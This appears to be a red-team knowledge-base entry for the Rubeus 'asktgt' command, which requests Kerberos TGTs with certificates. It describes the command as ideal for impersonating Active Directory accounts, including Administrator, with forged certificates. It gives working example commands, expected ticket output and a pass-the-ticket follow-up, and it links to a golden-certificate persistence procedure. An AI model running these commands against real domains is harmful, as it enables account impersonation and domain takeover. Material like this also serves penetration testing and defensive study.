---
id: 19aa075b-94d6-46d5-ad2f-0312c9128305
name: rubeus-asktgt-with-certificate
type: command
executor: cmd
data: 'Rubeus.exe asktgt /user:$_USER /certificate:$_CERT_PATH /password:$_PASSWORD'
output: null
created_at: '2023-04-06T03:56:28.398506+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - tgt-request
verified: true
validated: true
---

# rubeus-asktgt-with-certificate

## Command

```cmd
Rubeus.exe asktgt /user:$_USER /certificate:$_CERT_PATH /password:$_PASSWORD
```

## Description

Requests a Kerberos TGT from the domain KDC using certificate-based authentication (PKINIT). Ideal for using forged certificates to impersonate AD accounts without passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/user` ($_USER) | Target AD username to impersonate | Yes |
| `/certificate` ($_CERT_PATH) | Path to .pfx certificate file | Yes |
| `/password` ($_PASSWORD) | Password for the .pfx file | Yes |

## Examples

### Basic Usage

```cmd
Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
```

### Advanced Usage (with Export)

```cmd
Rubeus.exe asktgt /user:Administrator /certificate:dc.pfx /password:Password123 /nowrap
```

## Expected Output

Base64 TGT ticket:

```
[*] Action: Ask TGT
[*] User: ron
[*] Certificate: Valid
[+] TGT request successful!
[TRKT] Ticket: 0;28f8a... (base64 ticket data)
[*] Session key: ...
```

Use the ticket for pass-the-ticket with 'Rubeus.exe ptt /ticket:<base64>'.

## Related

- [[procedures/Golden-Certificate-Domain-Persistence]]
- [[tools/Rubeus]]
